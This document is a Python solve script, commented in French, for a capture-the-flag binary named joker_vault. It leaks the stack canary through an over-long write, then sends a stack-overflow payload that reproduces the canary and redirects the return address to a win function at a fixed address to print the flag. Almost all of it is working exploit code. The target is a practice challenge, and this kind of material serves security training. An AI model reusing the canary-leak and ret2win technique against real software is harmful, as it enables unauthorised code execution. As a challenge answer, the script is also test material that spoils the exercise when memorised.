#!/usr/bin/env python3
"""
23x41's 0x8A7 -- JOKER'S VAULT TERMINAL (joker_vault)
Non-PIE ELF64, canary present (-fstack-protector-all), pas de PIE.

Flow :
  riddle_leak()
    read(0, buf, 0x20)           ; buf @ rbp-0x30, nom (ex. "petik")
    write(1, buf, 0x38)          ; leak 0x38 octets : nom + padding + canary
                                  ; canary = octets [0x28:0x30] du buffer (low byte = 0x00)
  check_password()
    read(0, buf2, 0x2bc)         ; buf2 @ rbp-0x50 -- overflow
    strncmp(buf2, "H4H4H4_G0TCH4", 13)   ; leurre, jamais appelé si on ret2win

Overflow : buf2[0x48] = canary (reproduit depuis le leak), +8 padding (saved rbp),
           +8 adresse retour -> open_batcave (fixe, pas de PIE : 0x4011a6).

Usage :
    python3 tools/jokervault-solve.py -q
    python3 tools/jokervault-solve.py --check
"""
import argparse
import struct
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
DEFAULT_BIN = HERE.parent / "original" / "joker_vault"

OPEN_BATCAVE = 0x4011A6

LEAK_PROMPT_MARK = b"Oh, '"
LEAK_END_MARK = b"'... how quaint."
LEAK_LEN = 0x38
CANARY_OFF = 0x28  # offset du canary dans les 0x38 octets leakés


def leak_canary(proc_in, proc_out, name: bytes) -> int:
    proc_in.write(name + b"\n")
    proc_in.flush()

    buf = b""
    while LEAK_END_MARK not in buf:
        chunk = proc_out.read(1)
        if not chunk:
            raise RuntimeError("pipe fermée avant le leak")
        buf += chunk

    start = buf.rfind(LEAK_PROMPT_MARK)
    if start < 0:
        raise RuntimeError("marqueur de leak introuvable")
    start += len(LEAK_PROMPT_MARK)
    leaked = buf[start:start + LEAK_LEN]
    if len(leaked) != LEAK_LEN:
        raise RuntimeError(f"leak incomplet : {len(leaked)} octets")

    canary_bytes = leaked[CANARY_OFF:CANARY_OFF + 8]
    canary = struct.unpack("<Q", canary_bytes)[0]
    return canary


def build_payload(canary: int) -> bytes:
    payload = b"A" * 0x48            # pad jusqu'au canary (buf2 @ rbp-0x50)
    payload += struct.pack("<Q", canary)   # canary reproduit
    payload += b"B" * 8                     # saved rbp (peu importe)
    payload += struct.pack("<Q", OPEN_BATCAVE)  # ret -> open_batcave (non-PIE)
    return payload


def solve(binary: Path, name: bytes, quiet: bool):
    proc = subprocess.Popen(
        [str(binary)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    try:
        canary = leak_canary(proc.stdin, proc.stdout, name)
        if not quiet:
            print(f"[+] canary leaké : {canary:#018x}", file=sys.stderr)

        payload = build_payload(canary)
        proc.stdin.write(payload + b"\n")
        proc.stdin.flush()
        proc.stdin.close()

        out = proc.stdout.read()
        proc.wait(timeout=5)
    finally:
        try:
            proc.kill()
        except Exception:
            pass

    return canary, payload, out


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--binary", type=Path, default=DEFAULT_BIN, help="chemin du binaire joker_vault")
    ap.add_argument("--name", default="petik", help="nom envoyé au premier prompt (défaut: petik)")
    ap.add_argument("-q", "--quiet", action="store_true", help="n'affiche que le flag")
    ap.add_argument("--check", action="store_true", help="vérifie que le flag FLAG{...} est bien présent en sortie")
    args = ap.parse_args()

    canary, payload, out = solve(args.binary, args.name.encode(), args.quiet)
    text = out.decode(errors="replace")

    flag = None
    for line in text.splitlines():
        if line.startswith("FLAG{"):
            flag = line.strip()
            break

    if args.quiet:
        print(flag or "<flag introuvable>")
    else:
        print(f"[+] canary : {canary:#018x}")
        print(f"[+] payload ({len(payload)} octets) : {payload.hex()}")
        print("----- sortie du programme -----")
        print(text)
        print("--------------------------------")
        print(f"[+] flag : {flag}")

    if args.check:
        ok = flag is not None and flag.startswith("FLAG{")
        print("CHECK:", "OK" if ok else "FAIL", file=sys.stderr)
        sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
